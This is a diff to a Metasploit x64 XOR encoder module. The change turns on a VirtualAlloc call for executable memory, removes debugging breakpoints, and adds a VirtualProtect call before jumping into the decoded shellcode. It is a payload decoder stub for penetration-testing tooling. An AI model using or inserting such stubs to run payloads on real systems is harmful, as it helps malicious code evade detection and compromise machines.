@@ -49,20 +49,17 @@ class MetasploitModule < Msf::Encoder::Xor
     start:
       pop rbp
 
-;      mov r9d,0x40                    ; PAGE_EXECUTE_READ_WRITE
-;      mov r8d,0x00103000              ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
-;      mov rdx,#{state.orig_buf.length}; dwSize
-;      xor rcx,rcx                     ; lpAddress
-;      mov r10d,#{block_api_hash('kernel32.dll', 'VirtualAlloc')}
-;      call rbp
+      mov r9d,0x40                    ; PAGE_EXECUTE_READ_WRITE
+      mov r8d,0x00103000              ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
+      mov rdx,#{state.orig_buf.length}; dwSize
+      xor rcx,rcx                     ; lpAddress
+      mov r10d,#{block_api_hash('kernel32.dll', 'VirtualAlloc')}
+      call rbp
 
       push rsp 
       mov r12, rsp
-      mov r13, r15
-      sub r13,#{state.orig_buf.length}
-      sub r13, 0x7a2
+      mov r13, rax
       mov r8, r13
-      int 0x3
     loop:
       mov rdx, r12
       mov rcx, r15
@@ -72,7 +69,14 @@ class MetasploitModule < Msf::Encoder::Xor
       add r8, 0x6
       cmp [r15], 0x0
       jnz loop
-      int 0x3
+      
+      mov r9, rdx                       ; PAGE_EXECUTE_READ_WRITE
+      mov r8d,0x20                      ; PAGE_EXECUTE_READ
+      mov rdx,#{state.orig_buf.length}  ; dwSize
+      mov rcx, r13
+      mov r10d,#{block_api_hash('kernel32.dll', 'VirtualProtect')}
+      call rbp ; VirtualProtect
+
       call r13
     get_payload:
       call got_payload
